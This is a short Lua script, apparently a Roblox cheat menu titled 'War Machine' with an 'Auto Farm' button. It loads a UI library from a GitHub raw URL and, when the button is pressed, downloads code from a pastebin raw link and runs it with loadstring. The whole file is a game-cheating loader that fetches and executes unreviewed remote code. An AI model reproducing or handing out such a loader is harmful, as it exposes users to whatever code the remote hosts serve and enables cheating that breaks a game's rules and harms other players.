local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wizard"))()

local PhantomForcesWindow = Library:NewWindow("War Machine")

local KillingCheats = PhantomForcesWindow:NewSection("Auto Farm")

KillingCheats:CreateButton("Activate", function()
    local scriptToExecute = game:HttpGet("https://pastebin.com/raw/uaPEXGNH")
    loadstring(scriptToExecute)()
end)